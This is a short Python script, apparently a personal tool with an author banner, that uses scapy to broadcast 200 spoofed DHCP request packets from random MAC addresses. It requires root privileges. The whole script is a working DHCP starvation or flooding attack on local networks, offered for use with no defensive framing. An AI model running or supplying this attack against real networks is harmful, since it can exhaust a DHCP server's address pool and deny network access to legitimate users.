import scapy.all as scapy
import os
import time

#Logo + signature + social media                               
print(r""" ||    _                                      _
           ||   //                                     ||
           || //    _____       _____            ___   ||
           ||\\    /  _  \  __ /  _  \ -     -  / _  \ ||
           ||  \\ /  (_|  ||/    (_)$  |     | | (_|  ||||____  
           ||   \\\_______||   \_____/ ||___|| \_____/||  _   \   __
                                                      || |_).  |//__)
                                                  _____|_\_____/||___ .01lig""")
print("\n****************************************************\n")
print("********Copyright of gilles karougbe, jully 2022********")
print("*********http://www.github.com/gilleskarougbe***********")
print("***********https://twiter.com/01karougbe****************")
print("***linkedin.com/in/essognim-gilles-karougbe-015979223***")
print("\n****************************************************\n")
#desable ip addr check
scapy.conf.checkIPaddr = False

def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    if not 'SUDO_UID' in os.environ.keys():
        print("You are not root!\nTry running this program with sudo privileges.")
        exit()
        
#buiding dhcp request messages
def send_dhcprequests():
    for i in range(200):
        src= scapy.RandMAC()
        mac = str(src)
        a = scapy.Ether(dst='ff:ff:ff:ff:ff:ff',src=mac,type= 0x0800)
        b = scapy.IP(src='0.0.0.0',dst='255.255.255.255')
        c = scapy.UDP(sport =68,dport = 67)
        d = scapy.BOOTP(op=1,chaddr =mac)
        e = scapy.DHCP(options=[('message-type','request'),('end')])
        #dhcp request message
        dhcp_request = a/b/c/d/e
        scapy.sendp(dhcp_request)
        time.sleep(1)

#check sudo  previleges
in_sudo_mode()
#sending requests
send_dhcprequests()



